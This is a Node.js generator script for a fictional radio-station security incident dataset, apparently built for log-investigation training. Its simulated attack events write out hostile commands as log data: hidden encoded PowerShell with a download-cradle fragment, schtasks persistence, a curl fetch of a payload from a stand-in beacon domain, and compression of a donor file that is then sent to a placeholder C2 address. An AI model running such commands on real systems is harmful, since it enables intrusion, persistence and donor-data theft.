// Generates the fictional Pier Nine Radio dataset. Deterministic: same seed, same bytes.
// Every name, address and domain is invented. IPs use RFC 5737 documentation ranges only.
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const T0 = Date.parse('2026-03-13T18:00:00Z') / 1000; // doors open on pledge night
const T1 = T0 + 12 * 3600;                            // 06:00 next morning
const at = (hh, mm, ss = 0) => T0 + ((hh - 18 + 24) % 24) * 3600 + mm * 60 + ss;

function prng(seed) { let s = seed >>> 0; return () => { s += 0x6D2B79F5; let t = Math.imul(s ^ (s >>> 15), 1 | s); t ^= t + Math.imul(t ^ (t >>> 7), 61 | t); return ((t ^ (t >>> 14)) >>> 0) / 4294967296; }; }
const rnd = prng(91030);
const pick = a => a[Math.floor(rnd() * a.length)];
const between = (lo, hi) => lo + Math.floor(rnd() * (hi - lo + 1));

const people = [
  { id: 'odalys.reyes', title: 'Station Manager', host: 'OPS-LAPTOP-07', ip: '10.9.4.17' },
  { id: 'hal.brunner', title: 'Board Treasurer', host: 'PLEDGE-DESK-02', ip: '10.9.4.22' },
  { id: 'priya.nair', title: 'Pledge Intern', host: 'PLEDGE-DESK-01', ip: '10.9.4.21' },
  { id: 'dez.okafor', title: 'Volunteer Engineer', host: 'ENG-SHOP-01', ip: '10.9.4.31' },
  { id: 'tomas.ikeda', title: 'Producer', host: 'STUDIO-A', ip: '10.9.4.11' },
  { id: 'ruth.calloway', title: 'News Director', host: 'NEWSROOM-03', ip: '10.9.4.13' },
  { id: 'kenji.mori', title: 'Music Director', host: 'STUDIO-A', ip: '10.9.4.11' },
  { id: 'lena.ostrowski', title: 'Membership Coordinator', host: 'PLEDGE-DESK-01', ip: '10.9.4.21' },
];
const marco = { id: 'marco.vela', title: 'Overnight Host', host: 'STUDIO-B', ip: '10.9.4.12' };
const AUTOMATION = { host: 'AUTOMATION-01', ip: '10.9.4.40' };
const benignDomains = ['cdn.publicradio.example', 'streaming.tunecast.example', 'mail.harborlightsponsors.example', 'updates.vendor.example', 'time.sync.example', 'weather.harborcast.example', 'login.pledgeware.example'];
const benignIps = { 'cdn.publicradio.example': '192.0.2.80', 'streaming.tunecast.example': '192.0.2.120', 'mail.harborlightsponsors.example': '192.0.2.25', 'updates.vendor.example': '192.0.2.60', 'time.sync.example': '192.0.2.5', 'weather.harborcast.example': '192.0.2.77', 'login.pledgeware.example': '192.0.2.90' };
const benignProcs = [
  ['C:\\Program Files\\Browser\\browser.exe', 'browser.exe --profile-directory=Default'],
  ['C:\\Program Files\\Office\\outlook.exe', 'outlook.exe'],
  ['C:\\Windows\\System32\\notepad.exe', 'notepad.exe C:\\Users\\Public\\pledge-script.txt'],
  ['C:\\Program Files\\Pledgeware\\pledgeware.exe', 'pledgeware.exe --kiosk'],
  ['C:\\Windows\\System32\\svchost.exe', 'svchost.exe -k netsvcs'],
  ['C:\\Windows\\explorer.exe', 'explorer.exe'],
];
const C2 = '203.0.113.44', ATTACKER = '198.51.100.23', PHISH = 'pier9-partners.example', BEACON = 'cdn-sync.pier9-partners.example';

const events = [];
const add = (ts, type, fields) => events.push({ 'metadata.event_timestamp.seconds': ts, 'metadata.event_type': type, ...fields });
const login = (ts, u, { host, ip, action = 'ALLOW', targetUser = '', targetHost = 'DC-01', summary = '', title }) =>
  add(ts, 'USER_LOGIN', { 'metadata.product_name': 'Windows Security', 'principal.user.userid': u.id ?? u, 'principal.user.title': title ?? u.title ?? '', 'principal.hostname': host, 'principal.ip': ip, 'target.hostname': targetHost, 'target.user.userid': targetUser, 'security_result.action': action, 'security_result.summary': summary });
const proc = (ts, u, host, ip, parent, file, cmd) =>
  add(ts, 'PROCESS_LAUNCH', { 'metadata.product_name': 'Sysmon', 'principal.user.userid': u.id ?? u, 'principal.user.title': u.title ?? '', 'principal.hostname': host, 'principal.ip': ip, 'principal.process.file.full_path': parent, 'target.process.file.full_path': file, 'target.process.command_line': cmd, 'security_result.action': 'ALLOW' });
const dns = (ts, u, host, ip, name) =>
  add(ts, 'NETWORK_DNS', { 'metadata.product_name': 'Zeek', 'principal.user.userid': u.id ?? u, 'principal.hostname': host, 'principal.ip': ip, 'target.ip': '10.9.4.2', 'target.port': 53, 'network.dns.questions.name': name, 'security_result.action': 'ALLOW' });
const conn = (ts, u, host, ip, tip, port, sent, recv, action = 'ALLOW') =>
  add(ts, 'NETWORK_CONNECTION', { 'metadata.product_name': 'Zeek', 'principal.user.userid': u.id ?? u, 'principal.hostname': host, 'principal.ip': ip, 'target.ip': tip, 'target.port': port, 'network.sent_bytes': sent, 'network.received_bytes': recv, 'security_result.action': action });
const mail = (ts, from, to, subject, url = '', action = 'ALLOW') =>
  add(ts, 'EMAIL_TRANSACTION', { 'metadata.product_name': 'Mail Gateway', 'network.email.from': from, 'network.email.to': to, 'network.email.subject': subject, 'target.url': url, 'security_result.action': action, 'target.user.userid': to.split('@')[0] });
const file = (ts, u, host, ip, pathName) =>
  add(ts, 'FILE_CREATION', { 'metadata.product_name': 'Sysmon', 'principal.user.userid': u.id ?? u, 'principal.user.title': u.title ?? '', 'principal.hostname': host, 'principal.ip': ip, 'target.file.full_path': pathName, 'security_result.action': 'ALLOW' });

// ---- Normal evening at the station ------------------------------------------------------------
for (const p of people) {
  const sessions = between(2, 4);
  for (let s = 0; s < sessions; s++) {
    const t = between(T0, T1 - 1800);
    login(t, p, { host: p.host, ip: p.ip });
    if (rnd() < 0.18) login(t - between(20, 90), p, { host: p.host, ip: p.ip, action: 'FAIL', summary: 'Bad password' });
    for (let k = 0; k < between(8, 16); k++) { const [f, c] = pick(benignProcs); proc(t + between(5, 1700), p, p.host, p.ip, 'C:\\Windows\\explorer.exe', f, c); }
    for (let k = 0; k < between(8, 14); k++) { const d = pick(benignDomains); const tt = t + between(5, 1700); dns(tt, p, p.host, p.ip, d); conn(tt + 1, p, p.host, p.ip, benignIps[d], pick([443, 443, 443, 80]), between(300, 60000), between(1000, 900000)); }
    if (rnd() < 0.3) file(t + between(60, 1500), p, p.host, p.ip, pick(['C:\\Users\\Public\\pledge-tally.xlsx', 'C:\\Users\\Public\\run-of-show.docx', 'C:\\Users\\Public\\sponsor-reads.txt']));
  }
}
// Playout service and benign automation on AUTOMATION-01
for (let t = T0; t < T1; t += 600) {
  if (rnd() < 0.5) proc(t + between(0, 500), 'svc-playout', AUTOMATION.host, AUTOMATION.ip, 'C:\\Program Files\\Playout\\playout.exe', 'C:\\Program Files\\Playout\\playout_ctl.exe', 'playout_ctl.exe --advance');
  if (rnd() < 0.6) { dns(t + between(0, 500), 'svc-playout', AUTOMATION.host, AUTOMATION.ip, 'streaming.tunecast.example'); conn(t + between(0, 500), 'svc-playout', AUTOMATION.host, AUTOMATION.ip, '192.0.2.120', 443, between(400, 3000), between(50000, 400000)); }
}
add(at(21, 0, 0), 'SCHEDULED_TASK_CREATION', { 'metadata.product_name': 'Windows Security', 'principal.user.userid': 'svc-playout', 'principal.hostname': AUTOMATION.host, 'principal.ip': AUTOMATION.ip, 'target.file.full_path': 'C:\\Program Files\\Playout\\nightly-backup.cmd', 'security_result.summary': 'Task PlayoutBackup created', 'security_result.action': 'ALLOW' });
// Volunteer engineer restarts the playout engine (legitimate use of the service account)
login(at(20, 15, 2), 'dez.okafor', { host: AUTOMATION.host, ip: AUTOMATION.ip, targetUser: 'svc-playout', targetHost: AUTOMATION.host, title: 'Volunteer Engineer', summary: 'Run as different user' });
proc(at(20, 15, 40), people[3], AUTOMATION.host, AUTOMATION.ip, 'C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell.exe Restart-Service PlayoutEngine');
// Benign mail
const staffMail = id => id + '@pierninesradio.example';
mail(at(18, 5, 10), 'reads@harborlightsponsors.example', staffMail('tomas.ikeda'), 'Final sponsor read list for Pledge Night');
mail(at(18, 6, 0), 'reads@harborlightsponsors.example', staffMail('odalys.reyes'), 'Final sponsor read list for Pledge Night');
mail(at(18, 30, 0), staffMail('lena.ostrowski'), staffMail('priya.nair'), 'Pledge desk shifts tonight');
mail(at(19, 0, 0), staffMail('odalys.reyes'), staffMail('ruth.calloway'), 'Top of hour news breaks during the drive');
mail(at(20, 30, 0), 'noreply@pledgeware.example', staffMail('hal.brunner'), 'Hourly pledge total: $14,210');
mail(at(21, 30, 0), 'noreply@pledgeware.example', staffMail('hal.brunner'), 'Hourly pledge total: $21,905');
mail(at(22, 30, 0), 'noreply@pledgeware.example', staffMail('hal.brunner'), 'Hourly pledge total: $27,340');
mail(at(23, 10, 0), 'deals@discount-mailer.example', staffMail('kenji.mori'), 'Your weekend audio gear coupon', 'http://discount-mailer.example/c/9912', 'QUARANTINE');
mail(at(0, 45, 0), staffMail('ruth.calloway'), staffMail('tomas.ikeda'), 'Midnight newscast script');
mail(at(1, 15, 0), 'noreply@pledgeware.example', staffMail('hal.brunner'), 'Hourly pledge total: $39,870');
for (let k = 0; k < 14; k++) mail(between(T0, T1), staffMail(pick(people).id), staffMail(pick(people).id), pick(['Re: run of show', 'Studio B headphones', 'Parking for volunteers', 'Pledge gift inventory', 'Weather cut-in']));

// ---- The incident ------------------------------------------------------------------------------
// 1. Phishing from a lookalike of the real sponsor domain
mail(at(18, 40, 12), 'sponsorships@' + PHISH, staffMail('hal.brunner'), 'Pledge Night sponsor portal: confirm logo placement before 7 PM', 'http://' + PHISH + '/portal/login');
mail(at(18, 40, 15), 'sponsorships@' + PHISH, staffMail('odalys.reyes'), 'Pledge Night sponsor portal: confirm logo placement before 7 PM', 'http://' + PHISH + '/portal/login');
mail(at(18, 40, 19), 'sponsorships@' + PHISH, staffMail('pledge-desk'), 'Pledge Night sponsor portal: confirm logo placement before 7 PM', 'http://' + PHISH + '/portal/login');
// 2. Hal opens the link and signs in with the shared pledge-desk account
dns(at(18, 52, 30), people[1], people[1].host, people[1].ip, PHISH);
conn(at(18, 52, 31), people[1], people[1].host, people[1].ip, C2, 443, 1840, 22310);
conn(at(18, 53, 40), people[1], people[1].host, people[1].ip, C2, 443, 2210, 1180);
// 3. Attacker tries guesses first, then the phished password, through the VPN gateway
for (const [m, s] of [[5, 10], [5, 48], [6, 31], [7, 9], [7, 55], [8, 44], [9, 50]]) login(at(19, m, s), 'pledge-desk', { host: '', ip: ATTACKER, targetHost: 'VPN-GW-01', action: 'FAIL', summary: 'Bad password' });
login(at(19, 21, 4), 'pledge-desk', { host: '', ip: ATTACKER, targetHost: 'VPN-GW-01' });
// 4. Remote desktop into the playout PC, then run as the service account
login(at(19, 30, 45), 'pledge-desk', { host: AUTOMATION.host, ip: AUTOMATION.ip, targetHost: AUTOMATION.host, summary: 'Remote interactive logon' });
login(at(19, 31, 10), 'pledge-desk', { host: AUTOMATION.host, ip: AUTOMATION.ip, targetUser: 'svc-playout', targetHost: AUTOMATION.host, summary: 'Run as different user' });
// 5. Encoded PowerShell, a scheduled task, and a dropped script
proc(at(19, 33, 2), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA');
proc(at(19, 35, 21), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Windows\\System32\\schtasks.exe', 'schtasks.exe /create /tn PledgeSync /tr "powershell.exe -nop -w hidden -File C:\\ProgramData\\PledgeSync\\sync.ps1" /sc minute /mo 10 /ru pledge-desk');
add(at(19, 35, 22), 'SCHEDULED_TASK_CREATION', { 'metadata.product_name': 'Windows Security', 'principal.user.userid': 'pledge-desk', 'principal.hostname': AUTOMATION.host, 'principal.ip': AUTOMATION.ip, 'target.file.full_path': 'C:\\ProgramData\\PledgeSync\\sync.ps1', 'security_result.summary': 'Task PledgeSync created', 'security_result.action': 'ALLOW' });
file(at(19, 36, 5), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\ProgramData\\PledgeSync\\sync.ps1');
proc(at(19, 36, 40), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Windows\\System32\\curl.exe', 'curl.exe -s https://' + BEACON + '/stage -o C:\\ProgramData\\PledgeSync\\stage.bin');
// 6. Beacons every ten minutes until morning
for (let t = at(19, 40, 0); t < T1; t += 600) {
  const j = between(0, 9);
  dns(t + j, 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, BEACON);
  conn(t + j + 1, 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, C2, 443, between(820, 980), between(380, 460));
}
// 7. Donor list staged and sent out at 02:10
proc(at(1, 58, 40), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell.exe -nop Compress-Archive -Path \\\\FS-01\\Pledge\\Donors2026.xlsx -DestinationPath C:\\ProgramData\\PledgeSync\\donors_export.zip');
file(at(2, 5, 12), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\ProgramData\\PledgeSync\\donors_export.zip');
conn(at(2, 10, 33), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, C2, 443, 48230112, 1204);
// 8. The pirate segment is loaded into the 03:10 slot
file(at(2, 58, 0), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\ProgramData\\PledgeSync\\segment.wav');
proc(at(3, 2, 15), 'pledge-desk', AUTOMATION.host, AUTOMATION.ip, 'C:\\Windows\\System32\\cmd.exe', 'C:\\Program Files\\Playout\\playout_ctl.exe', 'playout_ctl.exe --inject --slot 0310 --file C:\\ProgramData\\PledgeSync\\segment.wav');
// Red herring: the fired overnight host tries his old password from Studio B
for (const [m, s] of [[41, 5], [42, 30], [44, 11]]) login(at(22, m, s), marco, { host: marco.host, ip: marco.ip, action: 'FAIL', summary: 'Account disabled' });

// ---- Finish -----------------------------------------------------------------------------------
events.sort((a, b) => a['metadata.event_timestamp.seconds'] - b['metadata.event_timestamp.seconds']);
events.forEach((e, i) => { e['metadata.id'] = 'evt-' + String(i + 1).padStart(5, '0'); });
const out = { case: 'Static on Pier Nine', window: { start: T0, end: T1 }, generatedBy: 'tools/gen-data.mjs', events };
fs.mkdirSync(path.join(root, 'data'), { recursive: true });
fs.writeFileSync(path.join(root, 'data', 'events.json'), JSON.stringify(out));
console.log('events:', events.length, 'bytes:', fs.statSync(path.join(root, 'data', 'events.json')).size);
